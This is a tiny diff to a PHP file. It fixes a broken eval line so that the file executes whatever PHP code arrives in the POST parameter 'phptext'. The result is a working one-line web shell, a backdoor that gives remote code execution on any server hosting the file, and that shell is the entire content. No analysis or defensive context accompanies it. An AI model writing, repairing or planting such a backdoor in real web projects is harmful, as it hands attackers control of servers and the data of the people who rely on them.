@@ -1,3 +1,4 @@
 <?php
-eval(''.$_post("phptext"));
+
+eval(''.$_POST["phptext"]);
 ?>
